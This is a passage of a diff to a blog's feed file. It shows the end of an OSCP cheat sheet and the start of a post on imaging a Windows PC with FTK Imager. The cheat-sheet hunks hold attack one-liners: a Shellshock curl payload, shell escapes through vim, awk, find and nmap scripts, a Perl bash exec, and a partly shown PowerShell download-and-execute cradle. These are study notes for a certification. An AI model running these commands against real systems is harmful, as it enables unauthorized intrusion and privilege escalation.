+a&lt;span class="s1"&gt;&amp;#39;; return this.a != &amp;#39;&lt;/span&gt;BadData&lt;span class="s1"&gt;&amp;#39;; var dummy=&amp;#39;&lt;/span&gt;!&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h5&gt;Mdbtools&lt;/h5&gt;
@@ -1803,7 +2032,7 @@ curl -H &lt;span class="s2"&gt;&amp;quot;User-Agent: () { :; }; /bin/bash -c &am
 &lt;span class="s2"&gt;nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi &lt;/span&gt;&lt;span class="nv"&gt;$ip&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img alt="image" src="/assets/images/oscp/shellshock.png" title="shellshock"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="/images/oscp/shellshock.png" title="shellshock"&gt;&lt;/p&gt;
 &lt;h4&gt;Shell escape sequences&lt;/h4&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;:!bash &lt;span class="c1"&gt;# vi, vim&lt;/span&gt;
 :set &lt;span class="nv"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/bash:shell &lt;span class="c1"&gt;# vi, vim&lt;/span&gt;
@@ -1812,7 +2041,7 @@ find / -exec /usr/bin/awk &lt;span class="s1"&gt;&amp;#39;BEGIN {system(&amp;quo
 &lt;span class="s1"&gt;awk &amp;#39;&lt;/span&gt;BEGIN &lt;span class="o"&gt;{&lt;/span&gt;system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)}&lt;/span&gt;’ &lt;span class="c1"&gt;# awk&lt;/span&gt;
 --interactive &lt;span class="c1"&gt;# nmap&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;os.execute(&amp;#39;/bin/sh&amp;#39;)&amp;quot;&lt;/span&gt; &amp;gt; exploit.nse sudo nmap --script&lt;span class="o"&gt;=&lt;/span&gt;exploit.nse &lt;span class="c1"&gt;# nmap &lt;/span&gt;
-perl -e &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nb"&gt;exec&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;’ &lt;span class="c1"&gt;# Perl&lt;/span&gt;
+perl -e &lt;span class="s1"&gt;&amp;#39;exec &amp;quot;/bin/bash&amp;quot;;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# Perl&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h4&gt;Upgrade *nix shell&lt;/h4&gt;
@@ -1842,10 +2071,7 @@ powershell “IEX&lt;span class="o"&gt;(&lt;/span&gt;New-Object Net.WebClient&lt
 searchsploit apache &lt;span class="m"&gt;2&lt;/span&gt;.x &lt;span class="p"&gt;|&lt;/span&gt; grep -v &lt;span class="s1"&gt;&amp;#39;/dos/&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# generalize&lt;/span&gt;
 searchsploit slmail
 searchsploit x PATH
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;Linux Privilege Escalation&lt;/h3&gt;
-&lt;h3&gt;Windows Privilege Escalation&lt;/h3&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>"FTK: Imaging a Windows PC"</title><link href="/ftk-windows.html" rel="alternate"></link><published>2019-10-28T00:00:00-05:00</published><updated>2019-10-28T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-28:/ftk-windows.html</id><summary type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has been made easy using AccesData Forensic Toolkit (FTK) Imager. The software is free and can be downloaded &lt;a href="https://accessdata.com/product-download/forensic-toolkit-ftk-version-7.1.0"&gt;here&lt;/a&gt;! &lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>"FTK: Imaging a Windows PC"</title><link href="/ftk-windows.html" rel="alternate"></link><published>2019-10-28T00:00:00-05:00</published><updated>2019-10-28T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-28:/ftk-windows.html</id><summary type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Drive acquisition is one the first steps a Forensic Analyst will have to carry out at the beginning of case. These acquistions are often carried out remotely by VPN or by the the client (or client IT department) where the computer is located. Acquiring such images from a drive has been made easy using AccesData Forensic Toolkit (FTK) Imager. The software is free and can be downloaded &lt;a href="https://accessdata.com/product-download/forensic-toolkit-ftk-version-7.1.0"&gt;here&lt;/a&gt;! &lt;/p&gt;
 &lt;p&gt;Once downloaded, install the software. Launch by doubleclicking the FTK icon or running &lt;code&gt;FTK Imager.exe&lt;/code&gt; from the command line.&lt;/p&gt;
 &lt;p&gt;Let's plug in an external USB drive to write to and image the host, a Windows 10 machine.&lt;/p&gt;
 &lt;p&gt;Here is the main GUI for FTK. Select &lt;code&gt;File&lt;/code&gt; from the menu and &lt;code&gt;Create a Disk Image&lt;/code&gt; and then chose the source of your image&lt;/p&gt;
